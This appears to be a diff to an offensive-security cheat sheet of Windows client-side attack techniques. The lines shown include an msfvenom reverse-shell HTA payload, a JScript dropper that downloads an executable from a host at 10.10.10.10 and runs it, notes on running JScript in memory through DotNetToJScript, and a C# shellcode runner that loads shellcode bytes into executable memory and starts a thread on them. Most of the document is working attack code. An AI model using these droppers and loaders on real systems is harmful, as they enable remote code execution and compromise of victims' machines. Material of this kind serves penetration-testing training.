@@ -993,7 +993,7 @@ Craft payload
 sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o payload.hta
 ```
 
-## Exploiting Microsoft Office
+## Microsoft Office
 
 ### Executing PowerShell in Word using VBA 
 <details>
@@ -1328,7 +1328,16 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 ```
 </details>
 
-## Dropper in JScript
+## Windows Script Host
+
+Windows has default apps for opening certain file types. This can be viewed under: Settings > Apps > Default apps
+Note that for example powershell files are opened with notepad by default. Javascript Files are getting opened by the Windows Script Host and therefore are executing when double clicked.
+
+Important Info: Jscript will execute in a 64-bit context by default so we have to generate a 64-bit payload (in csharp format).
+
+Note VisualStudio: Console App (.NET Framework), C#
+
+### Dropper in JScript
 ```javascript
 var url = "http://10.10.10.10/bin.exe"
 var Object = WScript.CreateObject('MSXML2.XMLHTTP');
@@ -1352,6 +1361,102 @@ if (Object.Status == 200)
 var r = new ActiveXObject("WScript.Shell").Run("bin.exe");
 ```
 Use [setProxy](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms760236%28v%3dvs.85%29) to make it proxy aware.
+
+### Running JScript in Memory
+Since there's no known way to invoke the Win32 APIs directly from Jscript, we'll instead embed a compiled C# assembly in the Jscript file and execute it.
+To get a JScript file we will use [DotNetToJScript](https://github.com/tyranid/DotNetToJScript).
+
+**DotNetToJScript:**
+
+<details>
+  <summary>Expand</summary>
+
+
+</details>
+
+**Win32 API Calls From C#:**
+
+<details>
+  <summary>Expand</summary>
+MessageBox Example:
+First we look up MessageBox on [www.pinvoke.net](http://pinvoke.net/default.aspx/user32/MessageBox.html)
+```
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace ConsoleApp1
+{
+    class Program
+    {
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
+
+        static void Main(string[] args)
+        {
+             MessageBox(IntPtr.Zero, "This is my text", "This is my caption", 0);
+        }
+    }
+}
+```
+</details>
+
+**Shellcode Runner in C#:**
+
+<details>
+  <summary>Expand</summary>
+We combine VirtualAlloc, CreateThread, and WaitForSingleObject to execute shellcode in memory
+
+```
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace ConsoleApp1
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        static void Main(string[] args)
+        {
+            byte[] buf = new byte[630] {
+  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+  ...
+  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
+
+            int size = buf.Length;
+
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+            Marshal.Copy(buf, 0, addr, size);
+
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+```
+Note: Set CPU to x64 before building the
+
+</details>
+
 
 
 # Port Redirection and Tunneling
